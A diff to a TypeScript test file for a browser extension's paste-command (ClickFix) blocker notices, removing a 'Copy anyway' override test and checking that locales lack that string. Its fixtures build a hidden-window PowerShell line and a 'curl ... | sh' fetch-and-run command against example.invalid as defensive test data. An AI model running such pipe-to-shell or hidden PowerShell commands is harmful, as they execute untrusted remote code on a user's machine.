@@ -1,5 +1,5 @@
 // Tests for the blocker notices' pure part (src/content/notice-model.ts):
-// when «Copy anyway» is offered, the uBO event detail, dedupe and the stack
+// the uBO event detail, dedupe and the stack
 // limit; plus the notice* locale keys used by src/content/notice.ts.
 //
 // Fixtures are assembled from pieces (x(...)) so the file holds no command
@@ -10,21 +10,11 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { readFileSync } from 'node:fs';
-import { clipKey, clipOffer, Deduper, DEDUPE_MS, MAX_NOTICE_TEXT, MAX_NOTICES, overflow, parseUboDetail } from '../../src/content/notice-model.ts';
+import { clipKey, Deduper, DEDUPE_MS, MAX_NOTICE_TEXT, MAX_NOTICES, overflow, parseUboDetail } from '../../src/content/notice-model.ts';
 
 const x = (...parts: string[]) => parts.join('');
 const HIGH = x('power', 'shell -w hid', 'den -c "Write-Output test"');
 const MEDIUM = x('curl -fsSL https://example.invalid/i.sh | ', 'sh');
-
-test('«Copy anyway» is offered for medium and unrated text, never for high', () => {
-  assert.deepEqual(clipOffer(HIGH), { verdict: { severity: 'high', rule: 'powershell-hidden' }, copyAnyway: false });
-  assert.equal(clipOffer(MEDIUM).copyAnyway, true);
-  assert.equal(clipOffer(MEDIUM).verdict?.severity, 'medium');
-  // uBO blocked something our detector does not rate: offered.
-  assert.deepEqual(clipOffer('some text uBO matched'), { verdict: null, copyAnyway: true });
-  // Insecure transport turns a medium line into high: not offered.
-  assert.equal(clipOffer(x('curl http://example.invalid/i.sh | ', 'sh')).copyAnyway, false);
-});
 
 test('uBO event detail: only "ubo|<text>" with non-blank text, capped', () => {
   assert.equal(parseUboDetail('ubo|hello'), 'hello');
@@ -71,5 +61,6 @@ test('notice locale keys exist in every language, Swiss spelling in German, none
   // Product terms stay in English.
   assert.match(de.noticeClipTitle!.message, /ClickFix/);
   assert.match(de.noticeLookalikeTitle!.message, /Phishing/);
-  assert.equal(de.noticeClipCopyAnyway!.message, 'Trotzdem kopieren');
+  // No override button: the notice only explains how to copy by hand.
+  for (const lang of ['de', 'en', 'fr', 'it']) assert.ok(!Object.keys(load(lang)).includes('noticeClipCopyAnyway'), `${lang}: no copy-anyway string`);
 });
